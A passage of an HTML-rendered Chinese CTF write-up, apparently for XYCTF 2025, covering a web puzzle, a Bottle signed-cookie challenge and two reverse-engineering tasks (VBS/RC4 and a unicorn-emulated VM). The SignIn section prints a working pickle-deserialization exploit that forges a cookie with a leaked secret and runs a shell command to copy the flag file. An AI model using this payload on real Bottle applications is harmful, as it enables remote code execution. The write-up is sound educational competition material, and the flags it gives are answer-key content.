title=\"ez_puzzle\"></a>ez_puzzle</h3><p>查看js源码，找到_3KH_函数判断输出flag的地方</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>G <span class=\"token operator\">></span> yw4<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n      alert<span class=\"token punctuation\">(</span>O<span class=\"token punctuation\">[</span>s74<span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span>J74<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n      alert<span class=\"token punctuation\">(</span>$vfeRha_calc<span class=\"token punctuation\">(</span>S74 <span class=\"token operator\">+</span> G <span class=\"token operator\">/</span> Rw4<span class=\"token punctuation\">,</span> Y74<span class=\"token punctuation\">,</span> $v5sNVR<span class=\"token punctuation\">(</span>vS4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span></code></pre>\n\n<p>运行到此处即可</p>\n<p><img src=\"/images/image-1744626745337-3.png\"></p>\n<h3 id=\"SignIn\"><a href=\"#SignIn\" class=\"headerlink\" title=\"SignIn\"></a>SignIn</h3><p>访问&#x2F;secret 获得cookie </p>\n<p>疑似Bottle 框架的 signed cookie</p>\n<p>signed cookie 构造</p>\n<p><code>!4SSvdzbD0UYv84Lnpmm1VLtPBddCrvhgQOLkNQbhjek=</code>是 base 64 编码的   HMAC - SHA 1 签名</p>\n<p><code>gAWVGQAAAAAAAABdlCiMBG5hbWWUfZRoAYwFZ3Vlc3SUc2Uu</code>是 base64 编码的 Python 数据，反序列化后应该是</p>\n<p>也就是说第二端可以通过pickle 序列化攻击实现 rce</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> bottle <span class=\"token keyword\">import</span> SimpleCookie\n<span class=\"token keyword\">import</span> base64\n<span class=\"token keyword\">import</span> hmac\n<span class=\"token keyword\">import</span> hashlib\n<span class=\"token keyword\">import</span> pickle\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">make_signed_cookie</span><span class=\"token punctuation\">(</span>secret<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    pickled <span class=\"token operator\">=</span> pickle<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n    digest <span class=\"token operator\">=</span> hmac<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span>secret<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> pickled<span class=\"token punctuation\">,</span> hashlib<span class=\"token punctuation\">.</span>sha1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>digest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    cookie <span class=\"token operator\">=</span> <span class=\"token string\">'!'</span> <span class=\"token operator\">+</span> base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span>digest<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'?'</span> <span class=\"token operator\">+</span> base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span>pickled<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> cookie\n\n<span class=\"token comment\"># 假设你已经拿到 secret 内容：</span>\nsecret <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span>  <span class=\"token comment\"># ← 替换成实际值</span>\ndata <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"admin\"</span><span class=\"token punctuation\">&#125;</span>\nsigned_cookie <span class=\"token operator\">=</span> make_signed_cookie<span class=\"token punctuation\">(</span>secret<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"伪造的 Cookie 值：\"</span><span class=\"token punctuation\">,</span> signed_cookie<span class=\"token punctuation\">)</span></code></pre>\n\n<p>通过&#x2F;download 读取 签名</p>\n<p><img src=\"/images/image-20250406194123399-1744626745337-4.png\"></p>\n<pre class=\"language-vbnet\" data-language=\"vbnet\"><code class=\"language-vbnet\">Hell0_H@cker_Y0u_A3r_Sm@r7</code></pre>\n\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> bottle <span class=\"token keyword\">import</span> SimpleCookie\n<span class=\"token keyword\">import</span> base64\n<span class=\"token keyword\">import</span> hmac\n<span class=\"token keyword\">import</span> hashlib\n<span class=\"token keyword\">import</span> pickle\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">make_signed_cookie</span><span class=\"token punctuation\">(</span>secret<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    pickled <span class=\"token operator\">=</span> pickle<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n    digest <span class=\"token operator\">=</span> hmac<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span>secret<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> pickled<span class=\"token punctuation\">,</span> hashlib<span class=\"token punctuation\">.</span>sha1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>digest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    cookie <span class=\"token operator\">=</span> <span class=\"token string\">'!'</span> <span class=\"token operator\">+</span> base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span>digest<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'?'</span> <span class=\"token operator\">+</span> base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span>pickled<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> cookie\n\nsecret <span class=\"token operator\">=</span> <span class=\"token string\">\"Hell0_H@cker_Y0u_A3r_Sm@r7\"</span>  \n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Data</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__reduce__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n         \n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"__import__('os').popen('cat /flag*>/test.txt').read()\"</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\ndata <span class=\"token operator\">=</span> Data<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nencoded <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span>pickle<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>encoded<span class=\"token punctuation\">)</span>\nsigned_cookie <span class=\"token operator\">=</span> make_signed_cookie<span class=\"token punctuation\">(</span>secret<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"伪造的 Cookie 值：\"</span><span class=\"token punctuation\">,</span> signed_cookie<span class=\"token punctuation\">)</span></code></pre>\n\n<p>伪造cookie成功后再通过download 路由实现任意文件读取</p>\n<p><img src=\"/images/image-20250406200423921-1744626745337-5.png\"></p>\n<h2 id=\"Reverse\"><a href=\"#Reverse\" class=\"headerlink\" title=\"Reverse\"></a>Reverse</h2><h3 id=\"WARMUP\"><a href=\"#WARMUP\" class=\"headerlink\" title=\"WARMUP\"></a>WARMUP</h3><p>网上抄的VBS解密代码</p>\n<pre class=\"language-vbscript\" data-language=\"vbscript\"><code class=\"language-vbscript\">Function Defuscator(vbs)\n    Dim t\n    t &#x3D; InStr(1, vbs, &quot;Execute&quot;, 1)\n    t &#x3D; Mid(vbs, t + Len(&quot;Execute&quot;))\n    t &#x3D; Eval(t)\n    Defuscator &#x3D; t\nEnd Function\n\nDim fso, i, outFile\nConst ForReading &#x3D; 1, ForWriting &#x3D; 2\nSet fso &#x3D; CreateObject(&quot;Scripting.FileSystemObject&quot;)\n\n    &#39; 创建或打开一个文件用于写入输出\n    Set outFile &#x3D; fso.OpenTextFile(&quot;output.txt&quot;, ForWriting, True)\n\n        For i &#x3D; 0 To WScript.Arguments.Count - 1\n        Dim FileName\n        FileName &#x3D; WScript.Arguments(i)\n        Dim MyFile\n        Set MyFile &#x3D; fso.OpenTextFile(FileName, ForReading)\n            Dim vbs\n            vbs &#x3D; MyFile.ReadAll\n            outFile.WriteLine Defuscator(vbs)\n            MyFile.Close\n        Next\n\n        outFile.Close\n        Set fso &#x3D; Nothing</code></pre>\n\n<p>output.txt:</p>\n<pre class=\"language-vbscript\" data-language=\"vbscript\"><code class=\"language-vbscript\">MsgBox &quot;Dear CTFER. Have fun in XYCTF 2025!&quot;\nflag &#x3D; InputBox(&quot;Enter the FLAG:&quot;, &quot;XYCTF&quot;)\nwefbuwiue &#x3D; &quot;90df4407ee093d309098d85a42be57a2979f1e51463a31e8d15e2fac4e84ea0df622a55c4ddfb535ef3e51e8b2528b826d5347e165912e99118333151273cc3fa8b2b3b413cf2bdb1e8c9c52865efc095a8dd89b3b3cfbb200bbadbf4a6cd4&quot; &#39; 棰勮鐨凴C4鍔犲瘑缁撴灉锛堝崄鍏繘鍒舵牸寮忥級\nqwfe &#x3D; &quot;rc4key&quot;\n\n&#39; 淇鍚庣殑RC4鍔犲瘑鍑芥暟\nFunction RunRC(sMessage, strKey)\n    Dim kLen, i, j, temp, pos, outHex\n    Dim s(255), k(255)\n    \n    &#39; 鍒濆鍖栧瘑閽?\n    kLen &#x3D; Len(strKey)\n    For i &#x3D; 0 To 255\n        s(i) &#x3D; i\n        k(i) &#x3D; Asc(Mid(strKey, (i Mod kLen) + 1, 1)) &#39; 瀵嗛挜浣跨敤ASCII缂栫爜\n    Next\n    \n    &#39; KSA瀵嗛挜璋冨害\n    j &#x3D; 0\n    For i &#x3D; 0 To 255\n        j &#x3D; (j + s(i) + k(i)) Mod 256\n        temp &#x3D; s(i)\n        s(i) &#x3D; s(j)\n        s(j) &#x3D; temp\n    Next\n    \n    &#39; PRGA鍔犲瘑娴佺▼\n    i &#x3D; 0 : j &#x3D; 0 : outHex &#x3D; &quot;&quot;\n    For pos &#x3D; 1 To Len(sMessage)\n        i &#x3D; (i + 1) Mod 256\n        j &#x3D; (j + s(i)) Mod 256\n        temp &#x3D; s(i)\n        s(i) &#x3D; s(j)\n        s(j) &#x3D; temp\n        \n        &#39; 鍔犲瘑骞惰浆涓哄崄鍏繘鍒?\n        Dim plainChar, cipherByte\n        plainChar &#x3D; Asc(Mid(sMessage, pos, 1)) &#39; 鏄庢枃鎸堿SCII澶勭悊\n        cipherByte &#x3D; s((s(i) + s(j)) Mod 256) Xor plainChar\n        outHex &#x3D; outHex &amp; Right(&quot;0&quot; &amp; Hex(cipherByte), 2)\n    Next\n    \n    RunRC &#x3D; outHex\nEnd Function\n\n&#39; 涓婚獙璇侀€昏緫\nIf LCase(RunRC(flag, qwfe)) &#x3D; LCase(wefbuwiue) Then\n    MsgBox &quot;Congratulations! Correct FLAG!&quot;\nElse\n    MsgBox &quot;Wrong flag.&quot;\nEnd If\n\n\n</code></pre>\n\n<p>RC4解密，密钥为<strong>rc4key</strong></p>\n<p><img src=\"/images/1-1744626745337-7.png\"></p>\n<p>flag{We1c0me_t0_XYCTF_2025_reverse_ch@lleng3_by_th3_w@y_p3cd0wn‘s_chall_is_r3@lly_gr3@t_&amp;_fuN!}</p>\n<h3 id=\"ezVM\"><a href=\"#ezVM\" class=\"headerlink\" title=\"ezVM\"></a>ezVM</h3><p>通过字符串界面里的unicorn和加密函数的一些特征发现是使用了unicorn框架调用了一串代码。</p>\n<p>找一个使用unicorn框架的程序进行bindiff恢复一些unicorn函数的符号。</p>\n<p>发现是调用了一串ARM64的代码字节进行模拟执行，将输入字符串传入加密返回，并附上了一些data和栈空间初始化。</p>\n<p><img src=\"/images/2-1744626745337-6.png\"></p>\n<p><img src=\"/images/4-1744626745337-8.png\"></p>\n<p>将以上调用write写入的数据提取，随便找一个ARM64框架的.so复制到对应地址，以便反编译看代码。</p>\n<p>最后得到一个函数，很清晰的看出里面是一个VM虚拟机执行的流程。</p>\n<p><img src=\"/images/5-1744626745337-10.png\"></p>\n<p>使用c++编写代码调用unicorn库进行模拟。</p>\n<p>使用Hook，在关键计算地址处进行Hook，输出各个计算流程以及数据。</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;iostream></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;Windows.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;vector></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;iostream></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">\"data.hpp\"</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">\"unicorn/unicorn.h\"</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">pragma</span> <span class=\"token expression\"><span class=\"token function\">comment</span><span class=\"token punctuation\">(</span>lib<span class=\"token punctuation\">,</span></span><span class=\"token string\">\"unicorn-import.lib\"</span><span class=\"token expression\"><span class=\"token punctuation\">)</span></span></span>\n\n<span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">hook_code</span><span class=\"token punctuation\">(</span>uc_engine<span class=\"token operator\">*</span> uc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">uint64_t</span> address<span class=\"token punctuation\">,</span> <span class=\"token keyword\">uint32_t</span> size<span class=\"token punctuation\">,</span> <span class=\"token keyword\">void</span><span class=\"token operator\">*</span> user_data<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">uint64_t</span> w0<span class=\"token punctuation\">,</span>w1<span class=\"token punctuation\">,</span>w2<span class=\"token punctuation\">,</span>w3<span class=\"token punctuation\">,</span>w4<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>address <span class=\"token operator\">==</span> <span class=\"token number\">0x1fac</span><span class=\"token punctuation\">)</span> \n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">uc_reg_read</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> UC_ARM64_REG_W1<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>w1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">uc_reg_read</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> UC_ARM64_REG_W0<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>w0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"W3 = W1 ^ W0 --- %llx ^ %llx = %llx\\n\"</span><span class=\"token punctuation\">,</span> w1<span class=\"token punctuation\">,</span>w0<span class=\"token punctuation\">,</span>w1<span class=\"token operator\">^</span>w0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>address <span class=\"token operator\">==</span> <span class=\"token number\">0x2BE4</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">uc_reg_read</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> UC_ARM64_REG_W1<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>w1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">uc_reg_read</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> UC_ARM64_REG_W0<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>w0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"W3 = W1 >> W0 --- %llx >> %llx = %llx\\n\"</span><span class=\"token punctuation\">,</span> w1<span class=\"token punctuation\">,</span> w0<span class=\"token punctuation\">,</span> w1 <span class=\"token operator\">>></span> w0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>address <span class=\"token operator\">==</span> <span class=\"token number\">0x2DB4</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">uc_reg_read</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> UC_ARM64_REG_W1<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>w1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">uc_reg_read</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> UC_ARM64_REG_W0<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>w0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"W3 = W1 &lt;&lt; W0 --- %llx &lt;&lt; %llx = %llx\\n\"</span><span class=\"token punctuation\">,</span> w1<span class=\"token punctuation\">,</span> w0<span class=\"token punctuation\">,</span> w1 <span class=\"token operator\">&lt;&lt;</span> w0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>address <span class=\"token operator\">==</span> <span class=\"token number\">0x232C</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">uc_reg_read</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> UC_ARM64_REG_W3<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>w3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">uc_reg_read</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> UC_ARM64_REG_W0<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>w0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"W2 = W0 &amp; W3 --- %llx &amp; %llx = %llx\\n\"</span><span class=\"token punctuation\">,</span> w0<span class=\"token punctuation\">,</span> w3<span class=\"token punctuation\">,</span> w0 <span class=\"token operator\">&amp;</span> w3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>address <span class=\"token operator\">==</span> <span class=\"token number\">0x2054</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">uc_reg_read</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> UC_ARM64_REG_W3<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>w3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">uc_reg_read</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> UC_ARM64_REG_W0<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>w0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"W2 = W0 ^ W3 --- %llx ^ %llx = %llx\\n\"</span><span class=\"token punctuation\">,</span> w0<span class=\"token punctuation\">,</span> w3<span class=\"token punctuation\">,</span> w3 <span class=\"token operator\">^</span> w0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>address <span class=\"token operator\">==</span> <span class=\"token number\">0x2238</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">uc_reg_read</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> UC_ARM64_REG_W3<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>w3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">uc_reg_read</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> UC_ARM64_REG_W0<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>w0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"W2 = W0 ^ W3 --- %llx ^ %llx = %llx\\n\"</span><span class=\"token punctuation\">,</span> w0<span class=\"token punctuation\">,</span> w3<span class=\"token punctuation\">,</span> w3 <span class=\"token operator\">^</span> w0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>address <span class=\"token operator\">==</span> <span class=\"token number\">0x2180</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">uc_reg_read</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> UC_ARM64_REG_W1<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>w1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">uc_reg_read</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> UC_ARM64_REG_W4<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>w4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"W1 = W1 ^ W4 --- %llx ^ %llx = %llx\\n\"</span><span class=\"token punctuation\">,</span> w1<span class=\"token punctuation\">,</span> w4<span class=\"token punctuation\">,</span> w1 <span class=\"token operator\">^</span> w4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>address <span class=\"token operator\">==</span> <span class=\"token number\">0x1CC4</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">uc_reg_read</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> UC_ARM64_REG_W0<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>w0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">uc_reg_read</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> UC_ARM64_REG_W1<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>w1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"W2 = W1 + W0 --- %llx + %llx = %llx\\n\"</span><span class=\"token punctuation\">,</span> w1<span class=\"token punctuation\">,</span> w0<span class=\"token punctuation\">,</span> w1 <span class=\"token operator\">+</span> w0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>address <span class=\"token operator\">==</span> <span class=\"token number\">0x1A0C</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">uc_reg_read</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> UC_ARM64_REG_W0<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>w0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">uc_reg_read</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> UC_ARM64_REG_W1<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>w1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"W2 = W1 + W0 --- %llx + %llx = %llx\\n\"</span><span class=\"token punctuation\">,</span> w1<span class=\"token punctuation\">,</span> w0<span class=\"token punctuation\">,</span> w1 <span class=\"token operator\">+</span> w0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">uint8_t</span> Input<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"11112222111111111111111111111111\"</span><span class=\"token punctuation\">;</span>\n    uc_engine<span class=\"token operator\">*</span> uc<span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    uc_hook hook<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">uint64_t</span> InputAddr <span class=\"token operator\">=</span> <span class=\"token number\">0x14C28</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">uint64_t</span> Stack <span class=\"token operator\">=</span> <span class=\"token number\">0x7F0000</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">uint8_t</span> MyEncFlag<span class=\"token punctuation\">[</span><span class=\"token number\">100</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">uint64_t</span> Base <span class=\"token operator\">=</span> <span class=\"token number\">0x0000000001000000</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">uc_open</span><span class=\"token punctuation\">(</span>uc_arch<span class=\"token double-colon punctuation\">::</span>UC_ARCH_ARM64<span class=\"token punctuation\">,</span> uc_mode<span class=\"token double-colon punctuation\">::</span>UC_MODE_ARM<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>uc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">uc_mem_map</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> Base<span class=\"token punctuation\">,</span> UC_PROT_ALL<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">uc_mem_map</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> Stack <span class=\"token operator\">-</span> <span class=\"token number\">4096</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4000</span><span class=\"token punctuation\">,</span> UC_PROT_ALL<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">uc_hook_add</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>hook<span class=\"token punctuation\">,</span> UC_HOOK_CODE<span class=\"token punctuation\">,</span> hook_code<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">uc_mem_write</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> <span class=\"token number\">0x14C28</span><span class=\"token 